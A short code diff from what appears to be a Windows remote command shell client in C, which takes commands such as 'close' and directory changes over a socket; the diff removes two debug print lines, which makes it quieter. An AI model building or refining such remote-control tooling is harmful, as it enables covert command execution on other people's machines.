@@ -37,7 +37,6 @@ void conn(char ip[], int port)
         if (strncmp("close", data, 5) == 0)
         {
             char bye_mess[] = "Bye...\n";
-            printf("Command is 'close'...");
             send(s, bye_mess, sizeof(bye_mess), 0);
             WSACleanup();
             close(s);
@@ -48,7 +47,6 @@ void conn(char ip[], int port)
             char *r = data;
             r += 3;
             r[strlen(r)-1] = '\0';
-            printf("%s",r);
             chdir(r);
         }
         else
